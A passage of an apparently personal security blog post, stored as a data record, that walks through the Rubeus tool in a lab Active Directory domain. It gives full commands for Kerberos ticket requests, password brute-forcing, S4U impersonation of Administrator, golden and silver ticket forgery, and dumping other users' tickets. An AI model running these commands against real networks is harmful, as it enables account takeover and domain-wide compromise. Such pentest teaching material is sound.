purpose.\n            \nFor example, let’s create a TGS for the LDAP service. One or more service SPNs can be provided.\n            \n`rubeus.exe asktgs /user:harshitrajpal /ticket:doIFNDCCBTCgAwIBB...bA== /service:LDAP/dc1.ignite.local`            \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiMI6bD_rWmk3OnNX-A2fyRHpOAOuMB9C_79YtSoJITgwK-vMjtkrKnt8HmLMzt6zM0amwmzw8khiMatpV1CW9XCCRjp-1qhcbIWxz3yDZFfNs04v3DGllEd0ZROjkRqwd1ghVF3WbPCfx6HReUAb67OMvMV7IKrIl4zIa5oEwoIwTjRHSO5EJcNCqPIg/s16000/9.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiMI6bD_rWmk3OnNX-A2fyRHpOAOuMB9C_79YtSoJITgwK-vMjtkrKnt8HmLMzt6zM0amwmzw8khiMatpV1CW9XCCRjp-1qhcbIWxz3yDZFfNs04v3DGllEd0ZROjkRqwd1ghVF3WbPCfx6HReUAb67OMvMV7IKrIl4zIa5oEwoIwTjRHSO5EJcNCqPIg/s16000/9.png?w=640&ssl=1)\n            \nBy providing in the TGT we generated in the previous step (copying in notepad and removing enters to type the ticket in a single line) we have generated a TGS successfully.\n            \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZIVjHBOo3oUV7kNLe-E4sPeFKTAwW2e0nUV2BxXFxZ2R_Bni2LUjvkiKIL6o0Ugfs_S5N2Q8f383lwlGR0ZYYEcY0VNeha3W0UHtCM8-LaYDxBDWL8GUww5gK3Bb29OUr5U5FB2trJ4h7A3hJEP6BGlNBjcmbBBnaQ2pGfA1Yq7d0REz4DLydwjMjcw/s16000/10.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZIVjHBOo3oUV7kNLe-E4sPeFKTAwW2e0nUV2BxXFxZ2R_Bni2LUjvkiKIL6o0Ugfs_S5N2Q8f383lwlGR0ZYYEcY0VNeha3W0UHtCM8-LaYDxBDWL8GUww5gK3Bb29OUr5U5FB2trJ4h7A3hJEP6BGlNBjcmbBBnaQ2pGfA1Yq7d0REz4DLydwjMjcw/s16000/10.png?w=640&ssl=1)\n            \n### Klist\n            \nKlist command in Windows can be used to view the tickets generated in the system. Here, when we run klist command we can see that a KRBTGT and an LDAP TGS have been generated and stored in the session.\n            \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhXmMQ3Twpy5cfkNrwiuysEB9XtIXh5Onuq41Bmss3tO8zzDskS2mgte_KiIvRlPd_RyXr0MAFRP1tuBCkp4nZsAnXwW_gvyP0Fc0LsftC28dDE-V4DQIGExLvnrGD37LUhlyzROJIrdVf4hBDa0HNFhlZzjLIzQfedFGmAA3UzYsbDNPP-7dSmT2mL3w/s16000/11.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhXmMQ3Twpy5cfkNrwiuysEB9XtIXh5Onuq41Bmss3tO8zzDskS2mgte_KiIvRlPd_RyXr0MAFRP1tuBCkp4nZsAnXwW_gvyP0Fc0LsftC28dDE-V4DQIGExLvnrGD37LUhlyzROJIrdVf4hBDa0HNFhlZzjLIzQfedFGmAA3UzYsbDNPP-7dSmT2mL3w/s16000/11.png?w=640&ssl=1)\n            \n### Renew\n            \nThe renew function in Rubeus builds a TGT renewal exchange. We can specify a domain controller using the /dc flag which will be used as a destination for the renewal traffic. We can further use the **tgtdeleg** option with this and extract user’s credentials without elevation and keep it alive on another system for a week by default.\n            \n**/ptt** flag can also be used in conjunction to apply the Kerberos\n            \n`rubeus.exe renew /dc:dc1.ignite.local /ticket:doIFNDCCB....bA==`\n            \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi0GpSeTg61s0HWOXUHdRK5JkiFgSUmbHE6Hu8QPFINoVu4eEqrhwjcHgkE1N0vy8W_JenfEymZ7Wuzom7DSJ6SB_4A-t6xhhM3YXnM8gN0gu8AVq1yI0boCr_kPi_igdmkLF6SXz_42IPOR0qLwkAk6TffeJVnoZkAvNtc6zcQaccR5YRLVheZyn2dfQ/s16000/12.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi0GpSeTg61s0HWOXUHdRK5JkiFgSUmbHE6Hu8QPFINoVu4eEqrhwjcHgkE1N0vy8W_JenfEymZ7Wuzom7DSJ6SB_4A-t6xhhM3YXnM8gN0gu8AVq1yI0boCr_kPi_igdmkLF6SXz_42IPOR0qLwkAk6TffeJVnoZkAvNtc6zcQaccR5YRLVheZyn2dfQ/s16000/12.png?w=640&ssl=1)\n            \n**/autorenew** sub-function will put the exchange to sleep for endTime 30 minutes and after that window automatically renew the TGT and display the renewed ticket\n            \n`rubeus.exe renew /dc:dc1.ignite.local /autorenew /ticket:doIFNDCCBTCgAw...bA==`\n            \n ![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEirxuh_4JAood6FK5wMIFjbbs0mBlJXHHg46gL0FKhJWDkjDN3w9wfsBIexmRzJAtlxXozcTEeCVpU6C46ls0Pfp71GSt6jQTo9ma5H7Vph83B8TsK9lpiHim6VtnmtHOxxdXiLt1dEorn2IWthB-ugOAgUBNXAmseTdzwrlN7MjsNfuW6mQAsP8Y3FJw/s16000/14.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEirxuh_4JAood6FK5wMIFjbbs0mBlJXHHg46gL0FKhJWDkjDN3w9wfsBIexmRzJAtlxXozcTEeCVpU6C46ls0Pfp71GSt6jQTo9ma5H7Vph83B8TsK9lpiHim6VtnmtHOxxdXiLt1dEorn2IWthB-ugOAgUBNXAmseTdzwrlN7MjsNfuW6mQAsP8Y3FJw/s16000/14.png?w=640&ssl=1)\n            \nAs you may now observe that after a specified time interval a renewed TGT is shown\n            \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj9bgCsSYADAltUs7Q3vRTfTZDSOf9wRunhlIc3WNMZQChVO_iVgdHe8bCNACLVVLt4o4Ewk9U78KMJ3wiuwYiQGmsuWgp0W6T3wLYBVOKmBS7VZjRBPxEZJs_Tx-slKrZI9fPJxIKrhQXu7tbQR3966yrXxlLgVFsOFzb-zOtRAhv2U4Wb1xoa9HuNxQ/s16000/15.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj9bgCsSYADAltUs7Q3vRTfTZDSOf9wRunhlIc3WNMZQChVO_iVgdHe8bCNACLVVLt4o4Ewk9U78KMJ3wiuwYiQGmsuWgp0W6T3wLYBVOKmBS7VZjRBPxEZJs_Tx-slKrZI9fPJxIKrhQXu7tbQR3966yrXxlLgVFsOFzb-zOtRAhv2U4Wb1xoa9HuNxQ/s16000/15.png?w=640&ssl=1)\n            \n**Brute**\n            \nThe brute option in Rubeus can be used to perform a password bruteforce attack against all the existing user accounts in Active Directory. Many times, the same password is used with multiple accounts in real-life enterprise infrastructure. So, brute option can generate multiple TGTs in those accounts having the same password. /noticket can be used in conjunction with this option since no ticket is provided with this functionality. For example,\n            \n`rubeus.exe brute /password:Password@1 /noticket`\n            \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8INMtJE1du0EspNXMj77ZWTFOnXpqubTigbJ7OEAxdyYRsYdzmFOJ6-4TC9981a5sSh1gSumtK8toDQRacSx-xpU2atrsKCEmiXTlzVuc-WEDEfA_JGRDYtF14fyCnh9rpUCKBdyVKWzgX7BauXZv9MNt-_w1XmV8xOiuN4ZaLpQmy_5xzuuxZDvivA/s16000/16.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8INMtJE1du0EspNXMj77ZWTFOnXpqubTigbJ7OEAxdyYRsYdzmFOJ6-4TC9981a5sSh1gSumtK8toDQRacSx-xpU2atrsKCEmiXTlzVuc-WEDEfA_JGRDYtF14fyCnh9rpUCKBdyVKWzgX7BauXZv9MNt-_w1XmV8xOiuN4ZaLpQmy_5xzuuxZDvivA/s16000/16.png?w=640&ssl=1)\n            \n**Hash**\n            \nRubeus is capable of taking in passwords and generating hashes of them. These are of different formats including NTLM (rc4_hmac) hash. To do this, we can use a **hash** function and provide a domain using /domain, an account’s name (can be a machine account too) using the/user flag and the password using /password.\n            \n`rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1`\n            \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjZwNam6iqN9HFpOVruPYUbfV6Fv4Jdy5rhK3M5jh0bC0T8fCyiuaBZGICX4VpQMH8VgHtHC-W_xc75J_k3fc9VlCPhPjJAwrAYd2EjRxisDx0J7AA0RVzq8v1QSHG9EBQ_vKxFfwqIN8UxppwBCl4X6AlqH31yo_kUhXtwIoC6FMMXQjdIxkj4RM_RXA/s16000/17.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjZwNam6iqN9HFpOVruPYUbfV6Fv4Jdy5rhK3M5jh0bC0T8fCyiuaBZGICX4VpQMH8VgHtHC-W_xc75J_k3fc9VlCPhPjJAwrAYd2EjRxisDx0J7AA0RVzq8v1QSHG9EBQ_vKxFfwqIN8UxppwBCl4X6AlqH31yo_kUhXtwIoC6FMMXQjdIxkj4RM_RXA/s16000/17.png?w=640&ssl=1)\n            \nAs you can see 4 different hashes have been output. Various encryption ciphers are used in conjunction with popular hashing techniques. All of these ciphers are supported in AD environment and hence, may be used for different purposes.\n            \n**S4u**\n            \nWe saw above how we can generate hashes using Rubeus. Now let’s talk about one such attack where hashes can be used to impersonate another user and carry out delegation attacks. For a detailed write-up on delegation, and attacks follow the link **[here](https://www.hackingarticles.in/domain-escalation-resource-based-constrained-delegation/)**. In short, OS post-Windows server 2003 contained a Kerberos protocol extension called s4uself and s4uproxy. These protocols can be used to conduct delegation attacks. For example, in the example below, we have performed an attack called “Resource-Based Constrained Delegation” which benefits the **msDS-AllowedToActOnBehalfOfAnotherIdentity** option set in the attribute’s editor. Follow the article **[here](https://www.hackingarticles.in/domain-escalation-resource-based-constrained-delegation/)** for a full attack. In the example below, we’ll use the user noob’s hash and then impersonate Administrator account.\n            \n- /rc4: flag is used to provide user noob’s account.\n            \n- /impersonateuser: User that will be impersonated by noob.\n            \n- /msdsspn: A valid msDS-AllowedToActOnBehalfOfAnotherIdentity value for the account. Here, the domain controller\n            \n- /altservice: can be supplied to substitute one or more service names in the resulting .kirbi file.\n            \n- /ptt: Injects the resulting ticket in the current terminal session\n            \n`rubeus.exe s4u /user:noob$ /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /impersonateuser:Administrator /msdsspn:host/dc1.ignite.local /altservice:cifs /domain:ignite.local /ptt`\n            \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKaBMUp5U77qh_6bLSEV5bfowSgiBZUnNH2RVGlwxy6mUTG9N64BCvW5gcbsu6DIUNQ2Y3AmFBysTZZBbaXsZSivH7JAfNBMHVF9NjFyNc3_6qdjTyVa2Oh5Y3lkzvTMlMV0NptR-PLeyvgEPczWZdi1gf_AhJm9H_3vq1zXG_68zKek31PTNhtK5QDw/s16000/18.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKaBMUp5U77qh_6bLSEV5bfowSgiBZUnNH2RVGlwxy6mUTG9N64BCvW5gcbsu6DIUNQ2Y3AmFBysTZZBbaXsZSivH7JAfNBMHVF9NjFyNc3_6qdjTyVa2Oh5Y3lkzvTMlMV0NptR-PLeyvgEPczWZdi1gf_AhJm9H_3vq1zXG_68zKek31PTNhtK5QDw/s16000/18.png?w=640&ssl=1)\n            \nThis would generate a ticket for Administrator user over the specified SPN. In short, we can now act as DC.\n            \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUB3Gg2Pl5L3PtqMzd7Q7xa8K50p7yK8r3YqVEj5VgHAcAClYIFIwE4kiN-UcO58nHkB5BjLOOtlEAAIcd86f0oq3_I6K2XCmjkFVZnjDUggjoiycvgi9tOn-iuZ1FeiJY4BoxpP2dfMdC7xFQH7vpG-ahmBvjzVP1_QE6Hlv-LjJqBDnqkIi03zzb6A/s16000/19.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUB3Gg2Pl5L3PtqMzd7Q7xa8K50p7yK8r3YqVEj5VgHAcAClYIFIwE4kiN-UcO58nHkB5BjLOOtlEAAIcd86f0oq3_I6K2XCmjkFVZnjDUggjoiycvgi9tOn-iuZ1FeiJY4BoxpP2dfMdC7xFQH7vpG-ahmBvjzVP1_QE6Hlv-LjJqBDnqkIi03zzb6A/s16000/19.png?w=640&ssl=1)\n            \n### Golden Ticket\n                \nGolden tickets are forged KRBTGTs (Key Distribution Service account) which can be used to forge other TGTs. This provides an attacker persistence over the domain accounts. For a detailed walkthrough on the topic you can visit the article **[here](https://www.hackingarticles.in/domain-persistence-golden-ticket-attack/)**.\n                \nTo forge a golden ticket for user harshitrajpal, we first generate an AES hash (RC4 works too) using the hash command in Rubeus and then using the golden function like so. Here,\n                \n- /ldap: Retrieves information of user over LDAP protocol\n                \n- /user: Username whose ticket will be forged\n                \n- /printcmd: displays a one liner command that can be used to generate the ticket again that just got generated\n                \n`rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1`\n                \n`rubeus.exe golden /aes256:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /ldap /user:harshitrajpal /printcmd`\n                \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPW0OyVNb9deU4qubrM9AEjoOx7201V4pamhV-2Mru0bgQtPYpuvLlJkuOKv4V4mm0Oev2mb8XOF3JccaoZz3xtI5l8psPzgyrBbsYNB8lN3BjcNIVbbiit7B6-ly-ba4JeQ_aKuWgmQp_Vlwgiopb3z763jc82mW25GyqIOdhlWEV8YtqKGQsI6GQVA/s16000/20.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPW0OyVNb9deU4qubrM9AEjoOx7201V4pamhV-2Mru0bgQtPYpuvLlJkuOKv4V4mm0Oev2mb8XOF3JccaoZz3xtI5l8psPzgyrBbsYNB8lN3BjcNIVbbiit7B6-ly-ba4JeQ_aKuWgmQp_Vlwgiopb3z763jc82mW25GyqIOdhlWEV8YtqKGQsI6GQVA/s16000/20.png?w=640&ssl=1)\n                \nAs you can see various details like SID, userID, Service Key etc are being fetched over LDAP which are important to generate a ticket. PAC signing is also done and a TGT generated for harshitrajpal\n                \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjxY76i8rRENeczKVXlyQt-PAGh-qYsRVlpB7wJe-Up8Xnkv6aBrdlB7CQVFsBFznkq015OPZG3Y77ndDEAnQ2UsV4zmdzEONj1lJaf2NcJvg7TaOgE31UHNMER3COPjpOHUuu3XfwgQmdB4WcYn_sXi4bHMITqEbMghPGGrvs4pHHshPb-WnJKFr15VA/s16000/21.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjxY76i8rRENeczKVXlyQt-PAGh-qYsRVlpB7wJe-Up8Xnkv6aBrdlB7CQVFsBFznkq015OPZG3Y77ndDEAnQ2UsV4zmdzEONj1lJaf2NcJvg7TaOgE31UHNMER3COPjpOHUuu3XfwgQmdB4WcYn_sXi4bHMITqEbMghPGGrvs4pHHshPb-WnJKFr15VA/s16000/21.png?w=640&ssl=1)\n                \nAlso, at the end you’ll see a one liner command that can be used to generate this TGT again.\n                \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhfywgxE1QC5yHtbQrFXEPtYWOTQCW2-OvfyCFEcnV3kZX4O_HwPo1OK0pF-fN_TqCpzYuChAht98oyoZWFgawOvvrN6phmhaqcd_rhEscMJs6x2FLcjdFTwf6i2mUoaVwXwP9z_liDl9Y7O3eB7_YoRVJm5o42LcnjkS5-JFhYoyRv_219ADE8Zd-mnQ/s16000/22.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhfywgxE1QC5yHtbQrFXEPtYWOTQCW2-OvfyCFEcnV3kZX4O_HwPo1OK0pF-fN_TqCpzYuChAht98oyoZWFgawOvvrN6phmhaqcd_rhEscMJs6x2FLcjdFTwf6i2mUoaVwXwP9z_liDl9Y7O3eB7_YoRVJm5o42LcnjkS5-JFhYoyRv_219ADE8Zd-mnQ/s16000/22.png?w=640&ssl=1)\n                \nVarious other options can be used in conjunction with golden to modify the generated TGT like:\n                \n- /rangeinterval: After every time specified, a new ticket will be generated.\n                \n- /rangeend: Specifies the maximum time tickets will be generated for. Here, 5 days. Since rangeinterval is 1d, 5 different tickets will be generated.\n                \nFor a full list of modifications, see [this](https://github.com/GhostPack/Rubeus#ticket-forgery) page.\n                \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgUypE_lTmt2yK73cZqzgsmQQNTlCV36mrTI6qA649BmStnd2VqKiA8VYyUPv6hJTM-qGOBzoeTDZ11TDCeAZrjJVNsaSkBSDHDiFU_RQEEywN-i8bA9II87KdJjC1zdo7ekO1CxpuuNA9sSlz5L-5QfhKXLmPzYasAgLoCiD9ygPjc8lF3n4wn9oZWzQ/s16000/23.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgUypE_lTmt2yK73cZqzgsmQQNTlCV36mrTI6qA649BmStnd2VqKiA8VYyUPv6hJTM-qGOBzoeTDZ11TDCeAZrjJVNsaSkBSDHDiFU_RQEEywN-i8bA9II87KdJjC1zdo7ekO1CxpuuNA9sSlz5L-5QfhKXLmPzYasAgLoCiD9ygPjc8lF3n4wn9oZWzQ/s16000/23.png?w=640&ssl=1)\n                \n### Silver Ticket\n                \nSilver tickets are forged Kerberos Ticket Granting Service (TGS) Tickets but with silver tickets there is no communication with the domain controller. It is signed by the service account configured with an SPN for each server the Kerberos-authenticating service runs on. For more details visit the page **[here](https://adsecurity.org/?p=2011)**.\n                \nSilver ticket attack can be performed using Rubeus using silver function. Other customisations need be made like:\n                \n- /service: SPN of the service ticket is being generated for\n                \n- /rc4: Hash of a valid user (harshitrajpal here) which will be used to encrypt the generated ticket\n                \n- /user: username of the user whose hash is provided\n                \n- /creduser: User to be impersonated\n                \n- /credpassword: Password of the user to be impersonated\n                \n- /krbkey: used to create the KDCChecksum and TicketChecksum. This is the AES256 hmac sha1 hash in the following case.\n                \n- /krbenctype: type of encrypted hash used. Aes256 here.\n                \n`rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1`\n                \n`rubeus.exe silver /service:cifs/dc1.ignite.local /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /ldap /creduser:ignite.local\\Administrator /credpassword:Ignite@987 /user:harshitrajpal /krbkey:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /krbenctype:aes256 /domain:ignite.local /ptt`\n                \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEisS0kDD040twsfat2VTDk5Vb0CHVG5Ho8l7jvHce-9bDMM8q0bKmcZS-Mft-uYxbjVHPPvftsC-fmkKmWH7JKLW7gp9OhKSsh64nwt597z00_UyhrzIsbxvWYysVr2DFj__o88gbUKXoiH8ghDmX1nttn9j0URoOF8avXUSyibjLTmYWLBDAPgqIPFHA/s16000/24.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEisS0kDD040twsfat2VTDk5Vb0CHVG5Ho8l7jvHce-9bDMM8q0bKmcZS-Mft-uYxbjVHPPvftsC-fmkKmWH7JKLW7gp9OhKSsh64nwt597z00_UyhrzIsbxvWYysVr2DFj__o88gbUKXoiH8ghDmX1nttn9j0URoOF8avXUSyibjLTmYWLBDAPgqIPFHA/s16000/24.png?w=640&ssl=1)\n                \nThis helped us generate a silver ticker for Administrator account. And as a result, we are now able to access DC machine’s C drive\n                \n`dir \\\\dc1.ignite.local\\c$`                \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjXSuXCGmt8xKSiStl62a7d-U4QriyKnr09ulubQzP_4Xb3qvrtuswXkVm6d2JnRe2wW-fJCXEFZmwy-DYtS5tivoUszspE8U0tMbNs2MbnVW1rTihlWrJdQp_RlmtBhL2eIx_TwHPSn3wgsq1UfhhoPB9zY3zRsV77ZmCYZB-C8p510xPjbnutXcFNDA/s16000/25.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjXSuXCGmt8xKSiStl62a7d-U4QriyKnr09ulubQzP_4Xb3qvrtuswXkVm6d2JnRe2wW-fJCXEFZmwy-DYtS5tivoUszspE8U0tMbNs2MbnVW1rTihlWrJdQp_RlmtBhL2eIx_TwHPSn3wgsq1UfhhoPB9zY3zRsV77ZmCYZB-C8p510xPjbnutXcFNDA/s16000/25.png?w=640&ssl=1)\n \n### Ticket Management\n            \nRubeus contains multiple ticket management options that may aid a pentester to conduct operations effectively and stealthily. As a pentester, we need to manage our generated tickets.\n            \n**Ptt**\n            \nThe Rubeus ptt option can import the supplied ticket in command line. The /ptt can also be used in conjunction with other options that output tickets. For example,\n            \n`rubeus.exe ptt /ticket:doIFNDCCBTCgAwI...bA==`\n            \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgKTVmohjirCZfdaG4GGv7-wzWMuQ58Q1_TCFHqBRpx9oRXWvvKAnWSir3Eh6VFwNFbwjPW2owjtkj25OSt2QZtX91OHITOdFbYToEfxgKkchxA1hhppI0_GbkGZKvhobYRcJMR_n8eN_SX67_x-GS_u_mqEhba24FoFO6tjr1I3p2p6xsd1uaI8H2kEA/s16000/26.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgKTVmohjirCZfdaG4GGv7-wzWMuQ58Q1_TCFHqBRpx9oRXWvvKAnWSir3Eh6VFwNFbwjPW2owjtkj25OSt2QZtX91OHITOdFbYToEfxgKkchxA1hhppI0_GbkGZKvhobYRcJMR_n8eN_SX67_x-GS_u_mqEhba24FoFO6tjr1I3p2p6xsd1uaI8H2kEA/s16000/26.png?w=640&ssl=1)\n            \nAs you can see, the generated ticket has now been imported.\n            \n**Purge**\n            \nRubeus has a purge option which can purge/delete all the tickets existing in the current session.\n            \nHere, we demonstrate how we purged 2 tickets listed by klist.\n            \n`rubeus.exe purge`\n            \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEieNiT1NqlQJ6XX-v68CUP7L2r6GKfB7k4inUgNicpJfdwG25zZNJHQeekion5CN0asOuv8bdVDGlNLGfeoOqrmgfvdiK8Ws1Pya_9G56jX1XAN2M68-VRj8AmN6f30zGWpj-dSrTFKXcuysXB8X6wTrknGtv3gY8ug-tM2Dix9hE5ajlXBP58OudyvXg/s16000/27.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEieNiT1NqlQJ6XX-v68CUP7L2r6GKfB7k4inUgNicpJfdwG25zZNJHQeekion5CN0asOuv8bdVDGlNLGfeoOqrmgfvdiK8Ws1Pya_9G56jX1XAN2M68-VRj8AmN6f30zGWpj-dSrTFKXcuysXB8X6wTrknGtv3gY8ug-tM2Dix9hE5ajlXBP58OudyvXg/s16000/27.png?w=640&ssl=1)\n            \n**Describe**\n            \nOften we lose track of the tickets in system. Describe option helps us to view details about a particular base64 encrypted blob or ticket.kirbi file.\n            \nWe can provide the ticket using /ticket flag.\n            \n`rubeus.exe describe /ticket:doIFNDCCBTCg...bA==`\n            \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7WIoNU11b3w36Lw-C6yMzOBTFQxc7yc_-HXOlbJPfCnzdnN3paIj-5S8aSDB7zGWRHz-yeg3IiT1FTUhqgeN9xo6pJnO4fidzzgDOqGBbKNyv1j54uptRBvs2BFfWlJRmsqnM_Cy_kC7PuA9UysbRijcPorIUb3E4ZZrXLuVCfwCspDwVzBoUYAfF5A/s16000/28.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7WIoNU11b3w36Lw-C6yMzOBTFQxc7yc_-HXOlbJPfCnzdnN3paIj-5S8aSDB7zGWRHz-yeg3IiT1FTUhqgeN9xo6pJnO4fidzzgDOqGBbKNyv1j54uptRBvs2BFfWlJRmsqnM_Cy_kC7PuA9UysbRijcPorIUb3E4ZZrXLuVCfwCspDwVzBoUYAfF5A/s16000/28.png?w=640&ssl=1)\n            \n**Triage**\n            \nWhile klist views tickets for current session triage lists all the tickets. When a session is being run as an administrator, we can not only view tickets in the current user’s session memory but other user’s tickets in memory too.\n            \n- /luid: This flag can be used to provide a specific user ID.\n            \n`rubeus.exe triage`            \n`rubeus.exe triage /luid:*0x8f57c*`\n            \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiY-eDU_fYg-Ta1R9oB54ePb_m9XufvCqw8HWY9J52F9-2dKB3zjQb7L50ZyXuk9GulLVXul-uPlDeDRfkGvUXiM0uJF8RRbb9ZGHrtGDW6TL6SqMvSpg9InazDv7SrjpG5DQsDeXGLNp6O4akhBrlu9qL714Z_mi-G6Db8knG2YgQICInIPR2oyb0T2w/s16000/29.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiY-eDU_fYg-Ta1R9oB54ePb_m9XufvCqw8HWY9J52F9-2dKB3zjQb7L50ZyXuk9GulLVXul-uPlDeDRfkGvUXiM0uJF8RRbb9ZGHrtGDW6TL6SqMvSpg9InazDv7SrjpG5DQsDeXGLNp6O4akhBrlu9qL714Z_mi-G6Db8knG2YgQICInIPR2oyb0T2w/s16000/29.png?w=640&ssl=1)\n            \nAlso, when the LUID is known, we can purge particular user’s tickets too (elevated mode only)\n            \n`rubeus.exe purge /luid:*0x8f57c*`\n            \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiAKUAPB_XJDt6Tq5e8P6aR9obYD55fJBc83A0X11E6HQ-OPvfsuonWsT5MUVoB9GQYhCeaYRRP7tz1prxHmQ7v_DSUWpoCbBXozmfFwWxjNWQCJ8fEfw8cp6xhFXJWfqCAWcyixZ_Aajw4ArGdgMFj_tlqznpADDUFs4yY1RuQns1qfFU6IYmZO9WGTQ/s16000/30.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiAKUAPB_XJDt6Tq5e8P6aR9obYD55fJBc83A0X11E6HQ-OPvfsuonWsT5MUVoB9GQYhCeaYRRP7tz1prxHmQ7v_DSUWpoCbBXozmfFwWxjNWQCJ8fEfw8cp6xhFXJWfqCAWcyixZ_Aajw4ArGdgMFj_tlqznpADDUFs4yY1RuQns1qfFU6IYmZO9WGTQ/s16000/30.png?w=640&ssl=1)\n            \n**Dump**\n            \nIf the session is running in an elevated mode, a user can dump/ extract all the current TGTs and service tickets. Again, /luid can be provided to dump specific user’s tickets. /service can be used to filter these tickets.\n            \nFor example, /service:krbtgt displays only TGTs.\n            \n`rubeus.exe dump`\n            \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj0Wj1VAku1zDOX5hWi5X0sbmrJFZnXUu5eJQfHm8pXWCTHx0v62LUK30nibHWGq2RFDhFFCjXnSkccraTemLREKxKcd3gX42vNY7qdpwx7afNUL4907CfasdQo9jAFw5VbuXpPVovRHBzum8pdHBKJTj4spcRi2c66Or75V4gg9UwFXsWNzJYsU3BSsw/s16000/31.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj0Wj1VAku1zDOX5hWi5X0sbmrJFZnXUu5eJQfHm8pXWCTHx0v62LUK30nibHWGq2RFDhFFCjXnSkccraTemLREKxKcd3gX42vNY7qdpwx7afNUL4907CfasdQo9jAFw5VbuXpPVovRHBzum8pdHBKJTj4spcRi2c66Or75V4gg9UwFXsWNzJYsU3BSsw/s16000/31.png?w=640&ssl=1)\n\n\nNext part I'll work on the mitigation bit as it's own unit hope you learnt a few bit on the read ... 😊   ","source":"_posts/active-directory/kerberos-101.md","raw":"---\ntitle: \"KERBEROS\"\ndate: 2023-07-13\ndraft: false\ntags: [\"Active-Directory\"]\ndescription: \"Active Directory kerberos\"\ntop_img: /images/cyberpunk-red.jpg\n---\n\n\n![](https://redfoxsec.com/wp-content/uploads/2023/03/attacking-kerberos-part-2-thumbnail.png)\n## Kerberoasting\n    \nThe Kerberos protocol defines how clients interact with a network authentication service, clients obtain tickets from the Kerberos Key Distribution Center (KDC) and they submit these tickets to application servers when connections are established. uses port 88 by default and depends on the process of symmetric key cryptography.\n    \n*NB* [****kerberos uses tickets to authenticate a user and completely avoids sending passwords across the network**]**\n    \n![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*J6UHDf5fnbzdKTPawNq3UA.png)\n    \n### How Kerb Auth works!\n        \nIn every Active Directory domain, every domain controller runs a KDC service that provides requests for tickets to kerberos, which is the KRBTGT account in the AD domain.\n        